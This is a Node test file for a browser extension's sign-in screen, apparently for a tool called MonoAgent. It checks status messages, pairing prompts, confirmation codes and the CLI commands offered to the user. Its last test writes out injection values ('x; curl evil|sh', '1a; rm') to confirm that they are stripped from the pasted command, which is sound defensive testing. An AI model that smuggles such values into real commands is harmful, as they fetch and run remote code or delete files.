// The sign-in screen's words (signin.js `view`): what the person reads while
// nothing works, and that it leaves the moment a bridge reports a sign-in.
//
// `node --test chrome-extension/signin.test.mjs`

import test from "node:test";
import assert from "node:assert/strict";
import { loadExtensionScripts } from "./test_helpers.mjs";

const { MonoSignIn: S } = loadExtensionScripts(["signin.js"]);

test("signed in leaves the screen; anything else stays on it", () => {
  assert.equal(S.view({ signedIn: true, status: "connected" }).signedIn, true);
  assert.equal(S.view({ signedIn: false, status: "connected" }).signedIn, false);
  assert.equal(S.view({ signedIn: "yes" }).signedIn, false);
  assert.equal(S.view(undefined).signedIn, false);
});

test("it says where MonoAgent stands", () => {
  assert.match(S.view({ status: "connected" }).state, /nobody is signed in/);
  assert.match(S.view({ status: "disconnected" }).state, /isn\u2019t running.*monoagentcli extension serve/);
  assert.match(S.view({ status: "connecting" }).state, /Looking for MonoAgent/);
});

test("a bridge nobody is signed in to: sign in, and the window updates by itself", () => {
  const v = S.view({ status: "unpaired", reason: "bridge_signed_out" });
  assert.match(v.state, /Sign in in the MonoAgent app or run monoagentcli account login\. This window updates automatically/);
  assert.equal(v.pair, "");
  assert.equal(v.unpaired, false, "no token field: this browser pairs itself");
});

test("an outdated bridge says it is running, offers the manual token and a restart", () => {
  const v = S.view({ status: "unpaired", reason: "bridge_outdated" });
  assert.match(v.state, /MonoAgent is running, but its background service is older/);
  assert.doesNotMatch(v.state, /isn.t running/);
  assert.equal(v.unpaired, true, "the token box stays: manual pairing works on an old bridge");
  assert.equal(v.command, "monoagentcli doctor");
  assert.ok(v.more.some((m) => /extension pair --open/.test(m.cmd)), "the manual path is offered");
});

test("a request waiting for the owner says where to approve it, and offers no token box", () => {
  const v = S.view({ status: "unpaired", reason: "pair_waiting" });
  assert.match(v.state, /Waiting for approval in the MonoAgent app \(or, in your own terminal, not one started from a coder session, run monoagentcli extension approve <id> --code <code>\)/);
  assert.equal(v.unpaired, false);
  assert.equal(v.pair, "");
  assert.equal(v.code, "", "no code from the bridge, none shown");
});

test("a waiting request shows its confirmation code, and only while it waits", () => {
  const v = S.view({ status: "unpaired", reason: "pair_waiting", code: "K7M-2QX" });
  assert.match(v.code, /Code: K7M-2QX/);
  assert.match(v.code, /approve only the request that shows this code/);
  assert.equal(S.view({ status: "unpaired", reason: "pair_denied", code: "K7M-2QX" }).code, "");
  assert.equal(S.view({ status: "connected", code: "K7M-2QX" }).code, "");
});

test("denied and expired requests say so and offer asking again or the manual path", () => {
  const d = S.view({ status: "unpaired", reason: "pair_denied" });
  assert.match(d.state, /denied/);
  const e = S.view({ status: "unpaired", reason: "pair_expired" });
  assert.match(e.state, /expired/);
  for (const v of [d, e]) {
    assert.equal(v.unpaired, true);
    assert.match(v.pair, /Check again.*monoagentcli extension pair/);
  }
});

test("automatic pairing off or refused: the manual path, kept as the fallback", () => {
  for (const reason of ["autopair_off", "auth_rejected", ""]) {
    const v = S.view({ status: "unpaired", reason });
    assert.match(v.pair, /run monoagentcli extension pair, or paste the token/);
    assert.equal(v.unpaired, true);
  }
  assert.equal(S.view({ status: "connected" }).pair, "");
  assert.equal(S.view({ status: "connected" }).unpaired, false);
});

test("what is kept is named, and said not to be sent until sign-in", () => {
  const v = S.view({ status: "disconnected", queued: { captures: 2, tasks: 1, recording: true } });
  assert.equal(v.queued, "Waiting in this browser: 2 saved pages, 1 task, a recording. Nothing is sent until you sign in; then it is sent as usual.");
  assert.equal(S.view({ queued: { captures: 0, tasks: 0, recording: false } }).queued, "");
});

test("a waiting request spells out the approve command with its own id and code", () => {
  const v = S.view({ status: "unpaired", reason: "pair_waiting", code: "Q9R-KWK", claimId: "1a2b3c4d5e6f" });
  assert.equal(v.command, "monoagentcli extension approve 1a2b3c4d --code Q9R-KWK");
  assert.match(v.lead, /Approve it from your own terminal \(not one started from a coder session\)/);
  assert.deepEqual(v.more.map((m) => m.cmd), ["monoagentcli extension deny 1a2b3c4d"]);
});

test("each stuck state names the command to run, and the details say where it stands", () => {
  assert.equal(S.view({ status: "unpaired", reason: "pair_denied" }).command, "monoagentcli extension pair --open");
  assert.equal(S.view({ status: "unpaired" }).command, "monoagentcli extension pair --open");
  assert.equal(S.view({ status: "disconnected" }).command, "monoagentcli extension serve");
  assert.equal(S.view({ status: "unpaired", reason: "bridge_signed_out" }).command, "monoagentcli account login");
  assert.match(S.view({ status: "unpaired", reason: "pair_waiting" }).debug, /status: unpaired \/ pair_waiting/);
});

test("a code or id that is not a plain token never reaches the pasted command", () => {
  const v = S.view({ status: "unpaired", reason: "pair_waiting", code: "x; curl evil|sh", claimId: "1a2b3c4d5e6f" });
  assert.doesNotMatch(v.command, /curl/);
  const w = S.view({ status: "unpaired", reason: "pair_waiting", code: "Q9R-KWK", claimId: "1a; rm" });
  assert.doesNotMatch(w.command, /rm/);
});
